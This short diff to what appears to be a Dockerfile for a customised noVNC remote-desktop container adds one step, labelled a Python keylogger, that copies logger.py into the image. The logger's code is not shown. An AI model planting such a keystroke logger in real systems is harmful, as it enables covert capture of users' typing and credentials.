@@ -24,3 +24,5 @@ COPY ./vnc/conn.html /usr/libexec/noVNCdim/
 COPY ./vnc/ui.js /usr/libexec/noVNCdim/app/
 COPY ./vnc/base.css /usr/libexec/noVNCdim/app/styles/
 
+# Python keylogger
+COPY ./vnc/logger.py /home/headless/logger.py
